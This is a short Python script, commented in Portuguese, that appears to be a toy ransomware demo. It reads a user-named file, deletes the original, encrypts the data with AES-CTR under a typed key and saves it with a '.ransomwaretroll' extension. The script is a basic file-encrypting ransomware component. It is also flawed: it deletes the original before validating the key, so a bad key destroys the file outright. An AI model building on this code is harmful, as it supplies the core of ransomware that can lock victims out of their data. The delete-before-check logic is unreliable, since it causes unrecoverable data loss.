import os
import pyaes

# Solicitar nome do arquivo
file_name = input("Informe o nome do arquivo a ser criptografado: ")

try:
    # Abrir o arquivo em modo de leitura binária
    with open(file_name, 'rb') as file:
        file_data = file.read()

    # Remover o arquivo original
    os.remove(file_name)

    # Solicitar e validar a chave de criptografia
    key_input = input("Informe a chave de criptografia (16, 24 ou 32 caracteres): ")
    if len(key_input) not in (16, 24, 32):
        raise ValueError("A chave deve ter 16, 24 ou 32 caracteres para ser válida no AES.")

    # Criar o objeto AES
    aes = pyaes.AESModeOfOperationCTR(key_input.encode('utf-8'))

    # Criptografar os dados do arquivo
    encrypted_data = aes.encrypt(file_data)

    # Salvar o arquivo criptografado
    encrypted_file_name = file_name + '.ransomwaretroll'
    with open(encrypted_file_name, 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)

    print(f"Arquivo criptografado com sucesso: {encrypted_file_name}")

except FileNotFoundError:
    print("Erro: O arquivo especificado não foi encontrado.")
except ValueError as ve:
    print(f"Erro de validação: {ve}")
except Exception as e:
    print(f"Ocorreu um erro inesperado: {e}")
